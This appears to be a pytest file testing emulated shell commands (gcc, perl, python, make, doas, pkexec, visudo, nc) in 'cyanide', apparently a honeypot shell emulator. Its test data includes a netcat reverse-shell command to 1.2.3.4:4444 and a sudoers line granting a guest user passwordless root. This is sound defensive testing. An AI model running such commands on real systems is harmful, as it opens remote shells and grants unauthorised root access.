import pytest

from cyanide.core.emulator import ShellEmulator
from cyanide.vfs.commands.doas import DoasCommand
from cyanide.vfs.commands.gcc import GccCommand
from cyanide.vfs.commands.make import MakeCommand
from cyanide.vfs.commands.perl import PerlCommand
from cyanide.vfs.commands.pkexec import PkexecCommand
from cyanide.vfs.commands.python import PythonCommand


@pytest.fixture
def shell(mock_fs):
    return ShellEmulator(mock_fs, username="root")


@pytest.mark.asyncio
async def test_gcc(shell, mock_fs):
    cmd = GccCommand(shell)

    # Test fatal error (no args)
    stdout, stderr, rc = await cmd.execute([])
    assert rc == 1
    assert "fatal error: no input files" in stderr

    # Test --version
    stdout, stderr, rc = await cmd.execute(["--version"])
    assert rc == 0
    assert "gcc (Ubuntu 11.4.0-1ubuntu1~22.04)" in stdout

    # Test missing input file
    stdout, stderr, rc = await cmd.execute(["main.c"])
    assert rc == 1
    assert "error: main.c: No such file or directory" in stderr

    # Test successful compilation
    mock_fs.mkfile("/root/main.c", content=b"int main() { return 0; }")
    stdout, stderr, rc = await cmd.execute(["main.c", "-o", "my_prog"])
    assert rc == 0
    assert mock_fs.exists("/root/my_prog")
    assert mock_fs.get_node("/root/my_prog").perm == "-rwxr-xr-x"

    # Test compilation with -o missing arg (should not crash)
    await cmd.execute(["main.c", "-o"])
    assert rc == 0


@pytest.mark.asyncio
async def test_perl(shell, mock_fs):
    cmd = PerlCommand(shell)

    # Test -v
    stdout, stderr, rc = await cmd.execute(["-v"])
    assert rc == 0
    assert "This is perl 5" in stdout

    # Test -e
    stdout, stderr, rc = await cmd.execute(["-e", "print 'hello'"])
    assert rc == 0

    # Test missing script file
    stdout, stderr, rc = await cmd.execute(["missing.pl"])
    assert rc == 2
    assert "No such file or directory" in stderr

    # Test existing script file
    mock_fs.mkfile("/root/script.pl", content=b"print 'test'")
    stdout, stderr, rc = await cmd.execute(["script.pl"])
    assert rc == 0

    # Test -e missing arg
    stdout, stderr, rc = await cmd.execute(["-e"])
    assert rc == 1
    assert "requires an argument" in stderr


@pytest.mark.asyncio
async def test_python(shell, mock_fs):
    cmd = PythonCommand(shell)

    # Test --version
    stdout, stderr, rc = await cmd.execute(["--version"])
    assert rc == 0
    assert "Python 3.10" in stdout or "Python 3" in stdout

    # Test -c
    stdout, stderr, rc = await cmd.execute(["-c", "print('hello')"])
    assert rc == 0

    # Test missing script
    stdout, stderr, rc = await cmd.execute(["missing.py"])
    assert rc == 2
    assert "can't open file" in stderr

    # Test existing script
    mock_fs.mkfile("/root/test.py", content=b"print('test')")
    stdout, stderr, rc = await cmd.execute(["test.py"])
    assert rc == 0

    # Test -h
    stdout, stderr, rc = await cmd.execute(["-h"])
    assert rc == 0
    assert "usage: python" in stdout

    # Test interactive mode
    stdout, stderr, rc = await cmd.execute([])
    assert rc == 0
    assert ">>>" in shell.pending_input_prompt

    # Test REPL input
    stdout, stderr, rc = shell.pending_input_callback("print('hello')")
    assert "hello" in stdout
    assert shell.pending_input_prompt == ">>> "

    # Test REPL exit
    stdout, stderr, rc = shell.pending_input_callback("exit()")
    assert rc == 0


@pytest.mark.asyncio
async def test_make(shell, mock_fs):
    cmd = MakeCommand(shell)

    # Test missing Makefile
    stdout, stderr, rc = await cmd.execute([])
    assert rc == 2
    assert "No targets specified and no makefile found" in stderr

    # Test with Makefile
    mock_fs.mkfile("/root/Makefile", content=b"all:\n\tgcc main.c")
    stdout, stderr, rc = await cmd.execute([])
    assert rc == 0


@pytest.mark.asyncio
async def test_doas(shell, mock_fs):
    cmd = DoasCommand(shell)

    # Test doas whoami (as root, it just runs)
    stdout, stderr, rc = await cmd.execute(["whoami"])
    assert rc == 0
    assert "root" in stdout


@pytest.mark.asyncio
async def test_pkexec(shell, mock_fs):
    cmd = PkexecCommand(shell)

    # Test pkexec whoami
    stdout, stderr, rc = await cmd.execute(["whoami"])
    assert rc == 0
    assert "root" in stdout


@pytest.mark.asyncio
async def test_visudo(shell, mock_fs):
    from cyanide.vfs.commands.visudo import VisudoCommand

    cmd = VisudoCommand(shell)

    # Test permission denied (non-root)
    shell.username = "guest"
    stdout, stderr, rc = await cmd.execute([])
    assert rc == 1
    assert "Permission denied" in stderr

    # Test successful start (root)
    shell.username = "root"
    mock_fs.mkfile("/etc/sudoers", content="root ALL=(ALL) ALL")
    stdout, stderr, rc = await cmd.execute([])
    assert rc == 0
    assert "(visudo)" in shell.pending_input_prompt

    # Test adding lines
    shell.pending_input_callback("guest ALL=(ALL) NOPASSWD:ALL")
    assert shell.pending_input_prompt == "> "

    # Test DONE
    stdout, stderr, rc = shell.pending_input_callback("DONE")
    assert "success" in stdout
    assert "guest ALL=(ALL) NOPASSWD:ALL" in mock_fs.get_content("/etc/sudoers")

    # Test CANCEL
    await cmd.execute([])
    stdout, stderr, rc = shell.pending_input_callback("CANCEL")
    assert "aborted" in stdout


@pytest.mark.asyncio
async def test_nc(shell, mock_fs):
    from cyanide.vfs.commands.nc import NcCommand

    cmd = NcCommand(shell)

    # Test help
    stdout, stderr, rc = await cmd.execute(["--help"])
    assert rc == 0
    assert "Usage: nc" in stdout

    # Test reverse shell
    stdout, stderr, rc = await cmd.execute(["-e", "/bin/sh", "1.2.3.4", "4444"])
    assert rc == 1
    assert "timed out" in stderr

    # Test connection failed
    stdout, stderr, rc = await cmd.execute(["8.8.8.8", "53"])
    assert rc == 1
    assert "failed: Connection refused" in stderr

    # Test usage (insufficient args)
    stdout, stderr, rc = await cmd.execute(["just_host"])
    assert rc == 1
    assert "Usage: nc" in stdout
